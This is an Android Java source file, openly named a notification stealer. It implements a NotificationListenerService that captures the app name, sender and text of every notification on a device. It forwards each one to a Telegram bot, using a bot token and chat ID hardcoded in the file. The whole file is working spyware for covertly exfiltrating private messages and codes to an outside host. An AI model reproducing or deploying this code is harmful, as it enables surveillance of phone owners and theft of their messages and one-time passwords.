package com.example.notifstealer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class NotifListener extends NotificationListenerService {

    private static final String BOT_TOKEN = "9105045885:AAEYFLMoZhMuEKmmDc93WA1JWRPHR2gvQDU";
    private static final String CHAT_ID = "8751172651";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn.getNotification().extras != null) {
                String title = sbn.getNotification().extras.getString("android.title");
                String text = sbn.getNotification().extras.getString("android.text");
                String packageName = sbn.getPackageName();

                if (packageName.equals("com.example.notifstealer")) return;

                if (text != null) {
                    String msg = "📩 *New Notification* 📩\n\n" +
                                 "📱 *App:* " + packageName + "\n" +
                                 "👤 *From:* " + title + "\n" +
                                 "💬 *Text:* " + text;
                                 
                    sendTelegramMessage(msg);
                }
            }
        } catch (Exception e) {
            Log.e("NotifError", e.getMessage());
        }
    }

    private void sendTelegramMessage(String text) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";

                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes("UTF-8"));
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
